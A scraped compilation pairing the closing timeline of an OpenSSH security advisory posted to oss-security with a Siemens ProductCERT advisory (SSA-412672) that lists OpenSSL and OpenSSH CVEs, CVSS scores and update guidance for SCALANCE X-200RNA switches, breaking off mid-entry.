We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.chromium.org_15cd341a_20250126_080142.html ===



=== Content from cert-portal.siemens.com_7f5e184c_20250125_103000.html ===
Siemens Security Advisory by Siemens ProductCERT

SSA-412672: Multiple OpenSSL and OpenSSH Vulnerabilities in
SCALANCE X-200RNA Switch Devices before V3.2.7

Publication Date:
Last Update:
Current Version:
CVSS v3.1 Base Score: 9.8

2022-12-13
2022-12-13
V1.0

SUMMARY

SCALANCE X-200RNA switch devices before V3.2.7 contain multiple OpenSSL and OpenSSH vulnera-
bilities. The most severe of these vulnerabilities could allow a denial of service condition or could lead to
execution of arbitrary code.

Siemens has released updates for the affected products and recommends to update to the latest versions.

AFFECTED PRODUCTS AND SOLUTION

Affected Product and Versions

Remediation

SCALANCE X204RNA (HSR) (6GK5204-0BA00-
2MB2):
All versions < V3.2.7

SCALANCE X204RNA (PRP) (6GK5204-0BA00-
2KB2):
All versions < V3.2.7

SCALANCE X204RNA EEC (HSR) (6GK5204-
0BS00-2NA3):
All versions < V3.2.7

SCALANCE X204RNA EEC (PRP) (6GK5204-
0BS00-3LA3):
All versions < V3.2.7

SCALANCE
X204RNA
(6GK5204-0BS00-3PA3):
All versions < V3.2.7

EEC (PRP/HSR)

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

WORKAROUNDS AND MITIGATIONS

Siemens has identied the following specic workarounds and mitigations that customers can apply to
reduce the risk:

 Restrict access to the affected systems, especially to ports 22/tcp and 443/tcp to trusted IP

addresses only

 Deactivate the webserver if not required, and if deactivation is supported by the product

SSA-412672

 Siemens 2022

Page 1 of 19

Siemens Security Advisory by Siemens ProductCERT

Product-specic remediations or mitigations can be found in the section Affected Products and Solution.
Please follow the General Security Recommendations.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to congure the environment according to Siemens operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/
industrialsecurity

PRODUCT DESCRIPTION

The SCALANCE X-204RNA Industrial Ethernet network access points enable the cost-effective connection
of non-PRP terminal devices to separate parallel networks, where a high availability is required.

VULNERABILITY CLASSIFICATION

The vulnerability classication has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.rst.org/cvss/). The CVSS environmental score is specic to the customers
environment and will impact the overall CVSS score. The environmental score should therefore be
individually dened by the customer to accomplish nal scoring.

An additional classication has been performed using the CWE classication, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identication, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2003-0190

OpenSSH-portable (OpenSSH) 3.6.1p1 and earlier with PAM support enabled immediately sends
an error message when a user does not exist, which allows remote attackers to determine valid
usernames via a timing attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-208: Observable Timing Discrepancy

Vulnerability CVE-2003-1562

sshd in OpenSSH 3.6.1p2 and earlier, when PermitRootLogin is disabled and using PAM keyboard-
interactive authentication, does not insert a delay after a root login attempt with the correct password,
which makes it easier for remote attackers to use timing differences to determine if the password step
of a multi-step authentication is successful, a different vulnerability than CVE-2003-0190.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.1
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (Race Condition)

SSA-412672

 Siemens 2022

Page 2 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2014-8176

The dtls1_clear_queues function in ssl/d1_lib.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and
1.0.1 before 1.0.1h frees data structures without considering that application data can arrive between
a ChangeCipherSpec message and a Finished message, which allows remote DTLS peers to cause a
denial of service (memory corruption and application crash) or possibly have unspecied other impact
via unexpected application data.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-0207

The dtls1_listen function in d1_lib.c in OpenSSL 1.0.2 before 1.0.2a does not properly isolate the state
information of independent data streams, which allows remote attackers to cause a denial of service
(application crash) via crafted DTLS trafc, as demonstrated by DTLS 1.0 trafc to a DTLS 1.2 server.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-0208

The ASN.1 signature-verication implementation in the rsa_item_verify function in crypto/r-
sa/rsa_ameth.c in OpenSSL 1.0.2 before 1.0.2a allows remote attackers to cause a denial of service
(NULL pointer dereference and application crash) via crafted RSA PSS parameters to an endpoint
that uses the certicate-verication feature.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0209

Use-after-free vulnerability in the d2i_ECPrivateKey function in crypto/ec/ec_asn1.c in OpenSSL
before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow remote
attackers to cause a denial of service (memory corruption and application crash) or possibly have
unspecied other impact via a malformed Elliptic Curve (EC) private-key le that is improperly handled
during import.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-416: Use After Free

Vulnerability CVE-2015-0285

The ssl3_client_hello function in s3_clnt.c in OpenSSL 1.0.2 before 1.0.2a does not ensure that the
PRNG is seeded before proceeding with a handshake, which makes it easier for remote attackers to
defeat cryptographic protection mechanisms by snifng the network and then conducting a brute-force
attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

4.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-310: Cryptographic Issues

SSA-412672

 Siemens 2022

Page 3 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-0286

The ASN1_TYPE_cmp function in crypto/asn1/a_type.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r,
1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not properly perform boolean-type comparisons,
which allows remote attackers to cause a denial of service (invalid read operation and application
crash) via a crafted X.509 certicate to an endpoint that uses the certicate-verication feature.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-1024: Comparison of Incompatible Types

Vulnerability CVE-2015-0287

The ASN1_item_ex_d2i function in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zf, 1.0.0 before
1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not reinitialize CHOICE and ADB data
structures, which might allow attackers to cause a denial of service (invalid write operation and
memory corruption) by leveraging an application that relies on ASN.1 structure reuse.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-0288

The X509_to_X509_REQ function in crypto/x509/x509_req.c in OpenSSL before 0.9.8zf, 1.0.0 before
1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow attackers to cause a denial of service
(NULL pointer dereference and application crash) via an invalid certicate key.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0289

The PKCS#7 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m,
and 1.0.2 before 1.0.2a does not properly handle a lack of outer ContentInfo, which allows attackers
to cause a denial of service (NULL pointer dereference and application crash) by leveraging an
application that processes arbitrary PKCS#7 data and providing malformed data with ASN.1 encoding,
related to crypto/pkcs7/pk7_doit.c and crypto/pkcs7/pk7_lib.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0290

The multi-block feature in the ssl3_write_bytes function in s3_pkt.c in OpenSSL 1.0.2 before 1.0.2a on
64-bit x86 platforms with AES NI support does not properly handle certain non-blocking I/O cases,
which allows remote attackers to cause a denial of service (pointer corruption and application crash)
via unspecied vectors.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

SSA-412672

 Siemens 2022

Page 4 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-0291

The sigalgs implementation in t1_lib.c in OpenSSL 1.0.2 before 1.0.2a allows remote attackers
to cause a denial of service (NULL pointer dereference and daemon crash) by using an invalid
signature_algorithms extension in the ClientHello message during a renegotiation.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0292

Integer underow in the EVP_DecodeUpdate function in crypto/evp/encode.c in the base64-decoding
implementation in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows
remote attackers to cause a denial of service (memory corruption) or possibly have unspecied other
impact via crafted base64 data that triggers a buffer overow.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-0293

The SSLv2 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and
1.0.2 before 1.0.2a allows remote attackers to cause a denial of service (s2_lib.c assertion failure and
daemon exit) via a crafted CLIENT-MASTER-KEY message.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-1787

The ssl3_get_client_key_exchange function in s3_srvr.c in OpenSSL 1.0.2 before 1.0.2a, when client
authentication and an ephemeral Dife-Hellman ciphersuite are enabled, allows remote attackers to
cause a denial of service (daemon crash) via a ClientKeyExchange message with a length of zero.

CVSS v3.1 Base Score
CVSS Vector
CWE

3.7
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-1788

The BN_GF2m_mod_inv function in crypto/bn/bn_gf2m.c in OpenSSL before 0.9.8s, 1.0.0 before
1.0.0e, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b does not properly handle ECParameters structures
in which the curve is over a malformed binary polynomial eld, which allows remote attackers to cause
a denial of service (innite loop) via a session that uses an Elliptic Curve algorithm, as demonstrated
by an attack against a server that supports client authentication.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

SSA-412672

 Siemens 2022

Page 5 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-1789

The X509_cmp_time function in crypto/x509/x509_vfy.c in OpenSSL before 0.9.8zg, 1.0.0 before
1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of
service (out-of-bounds read and application crash) via a crafted length eld in ASN1_TIME data,
as demonstrated by an attack against a server that supports client authentication with a custom
verication callback.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-1790

The PKCS7_dataDecodefunction in crypto/pkcs7/pk7_doit.c in OpenSSL before 0.9.8zg, 1.0.0 before
1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service
(NULL pointer dereference and application crash) via a PKCS#7 blob that uses ASN.1 encoding and
lacks inner EncryptedContent data.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-1791

Race condition in the ssl3_get_new_session_ticket function in ssl/s3_clnt.c in OpenSSL before 0.9.8zg,
1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b, when used for a multi-threaded client,
allows remote attackers to cause a denial of service (double free and application crash) or possibly
have unspecied other impact by providing a NewSessionTicket during an attempt to reuse a ticket
that had been obtained earlier.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (Race Condition)

Vulnerability CVE-2015-1792

The do_free_upto function in crypto/cms/cms_smime.c in OpenSSL before 0.9.8zg, 1.0.0 before
1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of
service (innite loop) via vectors that trigger a NULL value of a BIO data structure, as demonstrated
by an unrecognized X.660 OID for a hash function.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2015-1794

The ssl3_get_key_exchange function in ssl/s3_clnt.c in OpenSSL 1.0.2 before 1.0.2e allows remote
servers to cause a denial of service (segmentation fault) via a zero p value in an anonymous Dife-
Hellman (DH) ServerKeyExchange message.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-682: Incorrect Calculation

SSA-412672

 Siemens 2022

Page 6 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-3193

The Montgomery squaring implementation in crypto/bn/asm/x86_64-mont5.pl in OpenSSL 1.0.2 before
1.0.2e on the x86_64 platform, as used by the BN_mod_exp function, mishandles carry propagation
and produces incorrect output, which makes it easier for remote attackers to obtain sensitive private-
key information via an attack against use of a (1) Dife-Hellman (DH) or (2) Dife-Hellman Ephemeral
(DHE) ciphersuite.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2015-3194

crypto/rsa/rsa_ameth.c in OpenSSL 1.0.1 before 1.0.1q and 1.0.2 before 1.0.2e allows remote
attackers to cause a denial of service (NULL pointer dereference and application crash) via an RSA
PSS ASN.1 signature that lacks a mask generation function parameter.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-3195

The ASN1_TFLG_COMBINE implementation in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zh,
1.0.0 before 1.0.0t, 1.0.1 before 1.0.1q, and 1.0.2 before 1.0.2e mishandles errors caused by mal-
formed X509_ATTRIBUTE data, which allows remote attackers to obtain sensitive information from
process memory by triggering a decoding failure in a PKCS#7 or CMS application.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2015-3196

ssl/s3_clnt.c in OpenSSL 1.0.0 before 1.0.0t, 1.0.1 before 1.0.1p, and 1.0.2 before 1.0.2d, when
used for a multi-threaded client, writes the PSK identity hint to an incorrect data structure, which
allows remote servers to cause a denial of service (race condition and double free) via a crafted
ServerKeyExchange message.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (Race Condition)

Vulnerability CVE-2015-3197

ssl/s2_srvr.c in OpenSSL 1.0.1 before 1.0.1r and 1.0.2 before 1.0.2f does not prevent use of disabled
ciphers, which makes it easier for man-in-the-middle attackers to defeat cryptographic protection
mechanisms by performing computations on SSLv2 trafc, related to the get_client_master_key and
get_client_hello functions.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

SSA-412672

 Siemens 2022

Page 7 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-4000

The TLS protocol 1.2 and earlier, when a DHE_EXPORT ciphersuite is enabled on a server but not on
a client, does not properly convey a DHE_EXPORT choice, which allows man-in-the-middle attackers
to conduct cipher-downgrade attacks by rewriting a ClientHello with DHE replaced by DHE_EXPORT
and then rewriting a ServerHello with DHE_EXPORT replaced by DHE, aka the Logjam issue.

CVSS v3.1 Base Score
CVSS Vector
CWE

3.7
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-310: Cryptographic Issues

Vulnerability CVE-2015-5352

The x11_open_helper function in channels.c in ssh in OpenSSH before 6.9, when ForwardX11Trusted
mode is not used, lacks a check of the refusal deadline for X connections, which makes it easier for
remote attackers to bypass intended access restrictions via a connection outside of the permitted time
window.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2015-5600

The kbdint_next_device function in auth2-chall.c in sshd in OpenSSH through 6.9 does not properly
restrict the processing of keyboard-interactive devices within a single connection, which makes it easier
for remote attackers to conduct brute-force attacks or cause a denial of service (CPU consumption) via
a long and duplicative list in the ssh -oKbdInteractiveDevices option, as demonstrated by a modied
client that provides a different password for each pam element on this list.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.2
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2015-6563

The monitor component in sshd in OpenSSH before 7.0 on non-OpenBSD platforms accepts extrane-
ous username data in MONITOR_REQ_PAM_INIT_CTX requests, which allows local users to conduct
impersonation attacks by leveraging any SSH login access in conjunction with control of the sshd uid
to send a crafted MONITOR_REQ_PWNAM request, related to monitor.c and monitor_wrap.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

2.9
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-6564

Use-after-free vulnerability in the mm_answer_pam_free_ctx function in monitor.c in sshd in OpenSSH
before 7.0 on non-OpenBSD platforms might allow local users to gain privileges by leveraging control
of the sshd uid to send an unexpectedly early MONITOR_REQ_PAM_FREE_CTX request.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.4
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

SSA-412672

 Siemens 2022

Page 8 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-6565

sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY devices, which allows local
users to cause a denial of service (terminal disruption) or possibly have unspecied other impact by
writing to a device, as demonstrated by writing an escape sequence.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.4
CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2015-8325

The do_setup_env function in session.c in sshd in OpenSSH through 7.2p2, when the UseLogin
feature is enabled and PAM is congured to read .pam_environment les in user home directories,
allows local users to gain privileges by triggering a crafted environment for the /bin/login program, as
demonstrated by an LD_PRELOAD environment variable.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.8
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2016-0701

The DH_check_pub_key function in crypto/dh/dh_check.c in OpenSSL 1.0.2 before 1.0.2f does not
ensure that prime numbers are appropriate for Dife-Hellman (DH) key exchange, which makes it
easier for remote attackers to discover a private DH exponent by making multiple handshakes with a
peer that chose an inappropriate number, as demonstrated by a number in an X9.42 le.

CVSS v3.1 Base Score
CVSS Vector
CWE

3.7
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0702

The MOD_EXP_CTIME_COPY_FROM_PREBUF function in crypto/bn/bn_exp.c in OpenSSL 1.0.1
before 1.0.1s and 1.0.2 before 1.0.2g does not properly consider cache-bank access times during
modular exponentiation, which makes it easier for local users to discover RSA keys by running a
crafted application on the same Intel Sandy Bridge CPU core as a victim and leveraging cache-bank
conicts, aka a CacheBleed attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.1
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0703

The get_client_master_key function in s2_srvr.c in the SSLv2 implementation in OpenSSL before
0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a accepts a nonzero CLIENT-
MASTER-KEY CLEAR-KEY-LENGTH value for an arbitrary cipher, which allows man-in-the-middle
attackers to determine the MASTER-KEY value and decrypt TLS ciphertext data by leveraging a
Bleichenbacher RSA padding oracle, a related issue to CVE-2016-0800.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

SSA-412672

 Siemens 2022

Page 9 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-0704

An oracle protection mechanism in the get_client_master_key function in s2_srvr.c in the SSLv2
implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before
1.0.2a overwrites incorrect MASTER-KEY bytes during use of export cipher suites, which makes
it easier for remote attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA
padding oracle, a related issue to CVE-2016-0800.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0705

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1
before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory
corruption) or possibly have unspecied other impact via a malformed DSA private key.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2016-0777

The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before
7.1p2 allows remote servers to obtain sensitive information from process memory by requesting
transmission of an entire buffer, as demonstrated by reading a private key.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.5
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-0778

The (1) roaming_read and (2) roaming_write functions in roaming_common.c in the client in OpenSSH
5.x, 6.x, and 7.x before 7.1p2, when certain proxy and forward options are enabled, do not properly
maintain connection le descriptors, which allows remote servers to cause a denial of service (heap-
based buffer overow) or possibly have unspecied other impact by requesting many forwardings.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.1
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-0797

Multiple integer overows in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allow remote
attackers to cause a denial of service (heap memory corruption or NULL pointer dereference) or
possibly have unspecied other impact via a long digit string that is mishandled by the (1) BN_dec2bn
or (2) BN_hex2bn function, related to crypto/bn/bn.h and crypto/bn/bn_print.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

SSA-412672

 Siemens 2022

Page 10 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-0798

Memory leak in the SRP_VBASE_get_by_user implementation in OpenSSL 1.0.1 before 1.0.1s and
1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory consumption) by
providing an invalid username in a connection attempt, related to apps/s_server.c and crypto/sr-
p/srp_vfy.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2016-0799

The fmtstr function in crypto/bio/b_print.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g
improperly calculates string lengths, which allows remote attackers to cause a denial of service
(overow and out-of-bounds read) or possibly have unspecied other impact via a long string, as
demonstrated by a large amount of ASN.1 data, a different vulnerability than CVE-2016-2842.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-0800

A cross-protocol attack was discovered that could allow an attacker to decrypt intercepted TLS
sessions by using a server supporting SSLv2 as a Bleichenbacher RSA padding oracle. In order to
exploit the vulnerability, the attacker must have network access to the affected devices and must be in
a privileged network position.

CVSS v3.1 Base Score
CVSS Vector
CWE

4.0
